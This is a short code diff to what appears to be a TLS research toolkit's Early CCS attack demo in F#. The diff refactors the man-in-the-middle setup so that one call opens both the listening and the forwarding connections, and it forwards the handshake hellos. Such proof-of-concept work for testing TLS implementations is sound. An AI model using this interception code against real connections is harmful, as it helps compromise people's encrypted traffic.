@@ -73,16 +73,14 @@ type Attack_EarlyCCS =
     static member runMITM (accept, server_name:string, ?port:int) : unit =
         let port = defaultArg port FlexConstants.defaultTCPPort in
 
-        // Start being a server
-        printf "Please connect to me, and I will attack you.\n";
-        let sst,_ = FlexConnection.serverOpenTcpConnection("0.0.0.0",port=6666) in
-        let sst,nsc,sch = FlexClientHello.receive(sst) in
+        // Start being a Man-In-The-Middle
+        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections("0.0.0.0",server_name,listener_port=6666,server_cn=server_name,server_port=port) in
 
-        // Start being a client
-        let cst,_   = FlexConnection.clientOpenTcpConnection(server_name,server_name,port) in
+        // Forward client Hello
+        let sst,nsc,sch = FlexClientHello.receive(sst) in
         let cst     = FlexHandshake.send(cst,sch.payload) in
         
-        // Forward server hello
+        // Forward server hello and control the ciphersuite
         let cst,nsc,csh   = FlexServerHello.receive(cst,sch,nsc) in
         if not (TLSConstants.isRSACipherSuite (TLSConstants.cipherSuite_of_name (getSuite csh))) then
             failwith "Early CCS attack demo only implemented for RSA key exchange"
